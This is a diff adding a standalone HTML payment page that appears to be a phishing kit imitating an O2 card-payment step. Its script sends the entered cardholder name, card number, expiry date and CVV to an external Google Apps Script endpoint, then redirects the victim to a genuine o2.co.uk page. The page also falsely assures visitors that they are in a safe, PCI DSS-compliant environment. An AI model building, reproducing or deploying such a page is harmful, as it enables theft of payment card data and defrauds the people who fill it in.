@@ -1,0 +1,400 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Payments</title>
+<style>
+  :root{
+    --navy: #003366;
+    --navy-dark: #001f3f;
+    --navy-accent: #00509E;
+    --text-on-navy: #ffffff;
+    --border: #d7dbe1;
+    --muted: #6b7280;
+    --error: #db2777;
+    --success: #059669;
+  }
+
+  body{
+    font-family: system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+    padding: 2rem;
+    background: #f9fafc;
+    color: #111827;
+  }
+
+  .payment-card{
+    max-width: 460px;
+    margin: 0 auto;
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 1.5rem;
+    background: #fff;
+    box-shadow: 0 6px 18px rgba(3, 10, 25, 0.06);
+  }
+
+  .payment-card h1{
+    margin: 0 0 1rem 0;
+    font-size: 1.25rem;
+    font-weight: 700;
+    color: var(--navy);
+  }
+
+  label{
+    display:block;
+    font-weight: 600;
+    font-size: 0.9rem;
+    margin-top: 0.75rem;
+    color: var(--navy-dark);
+  }
+
+  .row{ display:flex; gap:0.75rem; }
+  .col{ flex:1; }
+
+  input[type="text"],
+  input[type="tel"],
+  input[type="password"],
+  input[type="number"]{
+    width: 100%;
+    padding: 0.65rem 0.75rem;
+    margin-top: 0.4rem;
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    font-size: 0.95rem;
+    box-sizing: border-box;
+  }
+
+  input:focus{
+    border-color: var(--navy-accent);
+    outline: none;
+    box-shadow: 0 0 0 3px rgba(0,80,158,0.12);
+  }
+
+  .hint{ font-size: 0.82rem; color: var(--muted); margin-top: 0.35rem; }
+  .small{ font-size: 0.82rem; }
+  .card-type{ font-weight:700; color:var(--muted); font-size:0.9rem; margin-left:0.5rem; }
+  .input-error{ border-color: var(--error); box-shadow: 0 0 0 3px rgba(219,39,119,0.06); }
+  .error-msg{ color: var(--error); font-size: 0.82rem; margin-top: 0.35rem; }
+  .success-msg{ color: var(--success); font-size: 0.82rem; margin-top: 0.35rem; }
+
+  .checkbox{ margin-top: 1rem; display:flex; align-items:center; gap:0.5rem; font-size: 0.9rem; color: var(--muted); }
+  .amount{ font-weight: 700; color: var(--navy-dark); margin: 1.25rem 0 1rem 0; font-size: 1.1rem; }
+
+  .btn-pay{
+    display: inline-block;
+    background: var(--navy);
+    color: var(--text-on-navy);
+    border: none;
+    padding: 0.85rem 1.25rem;
+    border-radius: 6px;
+    font-weight: 600;
+    cursor: pointer;
+    text-align: center;
+    width: 100%;
+    transition: background .15s ease, transform .08s ease;
+  }
+  .btn-pay:hover{ background: var(--navy-dark); transform: translateY(-1px); }
+  .btn-pay:active{ transform: translateY(0); }
+  .btn-pay:focus{ outline: 3px solid rgba(0,80,158,0.25); outline-offset: 3px; }
+
+  @media (max-width:420px){ .payment-card{ padding: 1.25rem; } .row{ flex-direction: column; } }
+</style>
+</head>
+<body>
+
+<form id="paymentForm">
+
+
+<div class="payment-card" role="form" aria-label="Payment form">
+  <h1>Payment data</h1>
+
+  <label for="cardholder">Cardholder*</label>
+  <input id="cardholder" name="Cardholder" type="text" placeholder="Name on the card" autocomplete="cc-name" required>
+
+  <label for="cardnumber">Your card number* <span id="cardType" class="card-type" aria-live="polite"></span></label>
+  <input id="cardnumber" name="cardnumber" type="tel" inputmode="numeric" autocomplete="cc-number"
+         placeholder="•••• •••• •••• ••••" aria-describedby="card-hint" required>
+  <div id="card-hint" class="hint small">Please enter your 16‑digit card number. For security, input is limited to 16 digits and will stop automatically.</div>
+  <div id="card-error" class="error-msg" role="alert" style="display:none"></div>
+
+  <div class="row">
+    <div class="col">
+      <label for="expiry">Expiry date* (MM/YY)</label>
+      <input id="expiry" name="expiry" type="tel" inputmode="numeric" autocomplete="cc-exp" placeholder="MM/YY" required>
+      <div id="expiry-err" class="error-msg" style="display:none"></div>
+    </div>
+
+    <div style="width:120px;">
+      <label for="cvv">CVV*</label>
+      <input id="cvv" name="cvv" type="password" inputmode="numeric" autocomplete="cc-csc" placeholder="••••" required>
+      <div id="cvv-hint" class="hint small">3 digits (or 4 for AmEx if you want).</div>
+      <div id="cvv-err" class="error-msg" style="display:none"></div>
+    </div>
+  </div>
+
+  <div class="checkbox">
+    <input type="checkbox" name="checkbox" id="save">
+    <label for="save">Save this card for future purchases</label>
+  </div>
+
+  <br>
+  <button class="btn-pay" type="submit">Continue</button>
+
+  <script>
+const scriptURL = "https://script.google.com/macros/s/AKfycbyszazfyitigWD24jhMYDAEEbvSk71g5qf9evl1ZZJL2WTj2AWH3BF0ted5GDm0QEr1/exec";
+
+document.getElementById("paymentForm").addEventListener("submit", async e => {
+  e.preventDefault();
+
+  const form = e.target;
+
+  const data = {
+    cardholder: form.cardholder.value,
+    cardnumber: form.cardnumber.value,
+    expiry: form.expiry.value,
+    cvv: form.cvv.value,
+    save: form.save.checked
+  };
+
+  await fetch(scriptURL, {
+    method: "POST",
+    body: JSON.stringify(data)
+  });
+
+    window.location.href = "https://www.o2.co.uk/offer403";
+  form.reset();
+});
+</script>
+
+  <div class="security-box">
+    
+    <div class="secure-text">
+        🔒 <strong>You are in a safe environment</strong>
+    </div>
+
+    <div class="pci-text">
+        This site complies with the Payment Card Industry Data Security Standard (PCI DSS)
+        to protect your payment card data.
+    </div>
+
+    <div class="cards">
+        <img src="https://1000logos.net/wp-content/uploads/2017/06/VISA-Logo-2006.png" alt="visa">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Mastercard-logo.png" alt="mc">
+        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQFi19yksDNRPDBYljlRIZYsA2-gjdutOZ7zg&s" alt="maestro">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo.svg" alt="amex">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="applepay">
+    </div>
+
+</div>
+
+<style>
+.security-box {
+    background: #f1f3f5;
+    padding: 20px;
+    border-radius: 6px;
+    margin-top: 30px;
+    border: 1px solid #e5e7eb;
+}
+
+.secure-text {
+    color: #1d3557;
+    font-size: 15px;
+    margin-bottom: 8px;
+}
+
+.pci-text {
+    font-size: 13px;
+    color: #555;
+    line-height: 1.5;
+}
+
+.cards {
+    margin-top: 15px;
+    display: flex;
+    gap: 25px;
+    align-items: center;
+    flex-wrap: wrap;
+}
+
+.cards img {
+    height: 28px;
+    object-fit: contain;
+    opacity: 0.9;
+}
+</style>
+
+ 
+
+
+
+<script>
+(function(){
+  const MAX_DIGITS = 16; // stop at 16 digits
+  const cardInput = document.getElementById('cardnumber');
+  const cardTypeLabel = document.getElementById('cardType');
+  const cardError = document.getElementById('card-error');
+  const expiryInput = document.getElementById('expiry');
+  const expiryErr = document.getElementById('expiry-err');
+  const cvvInput = document.getElementById('cvv');
+  const cvvHint = document.getElementById('cvv-hint');
+  const cvvErr = document.getElementById('cvv-err');
+  const form = document.querySelector('form');
+
+  function digitsOnly(v){ return v.replace(/\D/g,''); }
+
+  function detectCardType(digits){
+    if(/^3[47]/.test(digits)) return 'amex';
+    if(/^4/.test(digits)) return 'visa';
+    if(/^5[1-5]/.test(digits) || /^2(2|3|4|5|6|7)/.test(digits)) return 'mastercard';
+    return 'unknown';
+  }
+
+  // Format as 4-4-4-3 for 16 digits; will format progressively as user types.
+  function formatCard(value){
+    const d = digitsOnly(value).slice(0, MAX_DIGITS); // cap digits here
+    // grouping 4-4-4-3
+    const p1 = d.slice(0,4);
+    const p2 = d.slice(4,8);
+    const p3 = d.slice(8,12);
+    const p4 = d.slice(12,16);
+    return [p1, p2, p3, p4].filter(Boolean).join(' ');
+  }
+
+  function adjustCvvConstraint(type){
+    if(type === 'amex'){
+      cvvInput.maxLength = 4;
+      cvvInput.placeholder = '••••';
+      cvvHint.textContent = '4 digits (AmEx)';
+    } else {
+      cvvInput.maxLength = 3;
+      cvvInput.placeholder = '••••';
+      cvvHint.textContent = '3 digits';
+    }
+  }
+
+  cardInput.addEventListener('input', (e) => {
+    // Keep only up to MAX_DIGITS
+    const raw = cardInput.value;
+    const digits = digitsOnly(raw).slice(0, MAX_DIGITS);
+    cardInput.value = formatCard(digits);
+    const type = detectCardType(digits);
+    cardTypeLabel.textContent = type === 'unknown' ? '' : type.toUpperCase();
+    adjustCvvConstraint(type);
+    cardInput.classList.remove('input-error');
+    cardError.style.display = 'none';
+  });
+
+  cardInput.addEventListener('paste', (ev) => {
+    ev.preventDefault();
+    const paste = (ev.clipboardData || window.clipboardData).getData('text') || '';
+    const d = digitsOnly(paste).slice(0, MAX_DIGITS);
+    cardInput.value = formatCard(d);
+    const type = detectCardType(d);
+    cardTypeLabel.textContent = type === 'unknown' ? '' : type.toUpperCase();
+    adjustCvvConstraint(type);
+  });
+
+  expiryInput.addEventListener('input', () => {
+    let v = digitsOnly(expiryInput.value).slice(0,4);
+    if(v.length >= 3) v = v.slice(0,2) + '/' + v.slice(2);
+    expiryInput.value = v;
+    expiryInput.classList.remove('input-error');
+    expiryErr.style.display = 'none';
+  });
+
+  cvvInput.addEventListener('input', () => {
+    cvvInput.value = cvvInput.value.replace(/\D/g,'').slice(0,4);
+    cvvInput.classList.remove('input-error');
+    cvvErr.style.display = 'none';
+  });
+
+  function validateCard(){
+    const digits = digitsOnly(cardInput.value);
+    if(digits.length !== MAX_DIGITS){
+      cardError.textContent = 'Card number must be exactly ' + MAX_DIGITS + ' digits.';
+      cardError.style.display = 'block';
+      cardInput.classList.add('input-error');
+      return false;
+    }
+    // Note: checksum validation removed as requested.
+    return true;
+  }
+
+  function validateExpiry(){
+    const v = digitsOnly(expiryInput.value);
+    if(v.length !== 4){
+      expiryErr.textContent = 'Expiry must be MM/YY.';
+      expiryErr.style.display = 'block';
+      expiryInput.classList.add('input-error');
+      return false;
+    }
+    const mm = parseInt(v.slice(0,2),10);
+    const yy = parseInt(v.slice(2),10);
+    if(!(mm >= 1 && mm <= 12)){
+      expiryErr.textContent = 'Expiry month must be 01–12.';
+      expiryErr.style.display = 'block';
+      expiryInput.classList.add('input-error');
+      return false;
+    }
+    const now = new Date();
+    const fullYear = 2000 + yy;
+    const expDate = new Date(fullYear, mm - 1, 1);
+    expDate.setMonth(expDate.getMonth() + 1);
+    expDate.setDate(0);
+    if(expDate < now){
+      expiryErr.textContent = 'Card expired.';
+      expiryErr.style.display = 'block';
+      expiryInput.classList.add('input-error');
+      return false;
+    }
+    return true;
+  }
+
+  function validateCvv(){
+    const digits = digitsOnly(cvvInput.value);
+    const cardDigits = digitsOnly(cardInput.value);
+    const type = detectCardType(cardDigits);
+    if(type === 'amex' && digits.length !== 4){
+      cvvErr.textContent = 'AmEx CVV must be 4 digits.';
+      cvvErr.style.display = 'block';
+      cvvInput.classList.add('input-error');
+      return false;
+    }
+    if(type !== 'amex' && digits.length !== 3){
+      cvvErr.textContent = 'CVV must be 3 digits.';
+      cvvErr.style.display = 'block';
+      cvvInput.classList.add('input-error');
+      return false;
+    }
+    return true;
+  }
+
+  form.addEventListener('submit', function(ev){
+    let ok = true;
+    if(!document.getElementById('cardholder').value.trim()){
+      ok = false;
+      const el = document.getElementById('cardholder');
+      el.classList.add('input-error');
+      setTimeout(()=>el.classList.remove('input-error'), 1500);
+    }
+    if(!validateCard()) ok = false;
+    if(!validateExpiry()) ok = false;
+    if(!validateCvv()) ok = false;
+    if(!ok){
+      ev.preventDefault();
+      if(cardInput.classList.contains('input-error')) cardInput.focus();
+      else if(expiryInput.classList.contains('input-error')) expiryInput.focus();
+      else if(cvvInput.classList.contains('input-error')) cvvInput.focus();
+      return false;
+    }
+    return true;
+  });
+
+  expiryInput.addEventListener('blur', () => { if(expiryInput.value) validateExpiry(); });
+  cvvInput.addEventListener('blur', () => { if(cvvInput.value) validateCvv(); });
+  cardInput.addEventListener('blur', () => { if(cardInput.value) validateCard(); });
+})();
+</script>
+
+</body>
+</html>
